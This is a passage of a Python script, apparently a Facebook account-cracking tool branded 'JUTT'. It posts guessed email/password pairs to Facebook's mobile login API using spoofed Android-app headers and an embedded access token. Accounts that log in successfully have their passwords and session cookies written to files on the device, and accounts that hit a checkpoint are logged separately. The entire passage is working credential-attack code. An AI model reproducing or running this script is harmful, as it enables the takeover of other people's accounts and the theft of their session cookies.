                        ua = "[FBAN/FB4A;FBAV/269.0.0.23.31;FBBV/65238985;FBDM/{density=3.0,width=861,height=1388};FBLC/en_BD;FBRV/51484705;FBCR/Bouygues Telecom;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A505FN;FBSV/10;FBOP/19;FBCA/arm64-v8a:null;]"
                        head = {'User-Agent': ua,
                                'Accept-Encoding': 'gzip, deflate',
                                'Connection': 'Keep-Alive',
                                'Content-Type': 'application/x-www-form-urlencoded',
                                'Host': 'graph.facebook.com',
                                'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                                'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                                'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                                'X-FB-Connection-Type': 'MOBILE.LTE',
                                'X-Tigon-Is-Retry': 'False',
                                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
                                'x-fb-device-group': '5120',
                                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                                'X-FB-Request-Analytics-Tags': 'graphservice',
                                'X-FB-HTTP-Engine': 'Liger',
                                'X-FB-Client-IP': 'True',
                                'X-FB-Server-Cluster': 'True',
                                'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32'}
                        data = {'adid':str(uuid.uuid4()),
                                'format':'json',
                                'device_id':str(uuid.uuid4()),
                                'email':ids,'password':pas,
                                'generate_analytics_claims':'1',
                                'community_id':'',
                                'cpl':'true',
                                'try_num':'1',
                                'family_device_id':str(uuid.uuid4()),
                                'credentials_type':'password',
                                'source':'login',
                                'error_detail_type':'button_with_disabled',
                                'enroll_misauth':'false',
                                'generate_session_cookies':'1',
                                'generate_machine_id':'1',
                                'currently_logged_in_userid':'0',
                                'locale': 'en_SV','client_country_code': 'SV',
                                'fb_api_req_friendly_name':'authenticate',
                                'api_key':'62f8ce9f74b12f84c123cc23437a4a32',
                                'access_token':accees_token}
                        url = 'https://b-graph.facebook.com/auth/login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=head).json()
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [JUTT-OK] '+ids+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        open('/sdcard/JUTT-XD-COOKIE.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
                                        open('/sdcard/JUTT-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                                print('\r\r \033[1;34m[JUTT-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                                print('\r\r\x1b[1;31m [JUTT-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/JUTT-CP.txt','a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                        else:
                                        continue
                loop+=1
        except Exception as e:
                time.sleep(20)              
menu()